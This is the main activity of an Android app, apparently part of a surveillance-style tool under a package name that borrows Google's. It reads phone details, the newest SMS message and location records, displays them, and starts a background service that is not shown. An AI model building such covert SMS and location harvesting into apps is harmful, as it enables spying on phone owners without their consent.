package com.google.infomationserver;

import com.google.infomationserver.bean.PhoneInfo;
import com.google.infomationserver.bean.SMSMessage;
import com.google.infomationserver.listenner.LocationListenner;
import com.google.infomationserver.util.LocationUtil;
import com.google.infomationserver.util.PhoneUtils;

import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.view.KeyEvent;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {

	public final static int REFRESH = 1;
	private TextView testInfo;
	private Context context;
	private TextView locationInfo;
	private MyHandler uiHandler;

	public class MyHandler extends Handler{
		/* (non-Javadoc)
		 * @see android.os.Handler#handleMessage(android.os.Message)
		 */
		@Override
		public void handleMessage(Message msg) {
			if(msg.what==REFRESH){
				locationInfo.setText(LocationUtil.getLocations().toString());
			}
		}
	}
	// private Thread t;
	// private String info;
	// private int tag = 1;

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		// Handler myHandler = new Handler() {
		// public void handleMessage(Message msg) {
		// switch (msg.what) {
		// case tag:
		// invalidate();
		// break;
		// }
		// super.handleMessage(msg);
		// }
		// };

		context = getApplicationContext();
		testInfo = (TextView) findViewById(R.id.testInfo);
		locationInfo = (TextView) findViewById(R.id.locationInfo);
		
		new LocationListenner(context,new MyHandler());

		// t = new Thread(new Runnable() {
		//
		// @Override
		// public void run() {
		//
		//
		// }
		// });
		// t.start();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.activity_main, menu);
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Activity#onResume()
	 */
	@Override
	protected void onResume() {
		super.onResume();
		runOnUiThread(new Runnable() {

			@Override
			public void run() {
				testInfo.setText(PhoneInfo
						.getPhoneInfo(context).toString()
						+ "\n"
						+ ((SMSMessage) PhoneUtils.getAllMessage(
								getApplicationContext()).get(0)).getFrom()
						+ "--->"
						+ ((SMSMessage) PhoneUtils.getAllMessage(
								context).get(0)).getTo()
						+ ((SMSMessage) PhoneUtils.getAllMessage(
								context).get(0))
								.getMessage_content());

				//获取位置记录
				locationInfo.setText("\n\n"+LocationUtil.getLocations().toString());
				Intent intentToStartService = new Intent();
				intentToStartService.setClass(context, InfomationServerService.class);
				startService(intentToStartService);
			}
		});
	}
	
	/* (non-Javadoc)
	 * @see android.app.Activity#onBackPressed()
	 */
	@Override
	public void onBackPressed() {
		// TODO Auto-generated method stub
		super.onBackPressed();
		MainActivity.this.onDestroy();
	}
	
}
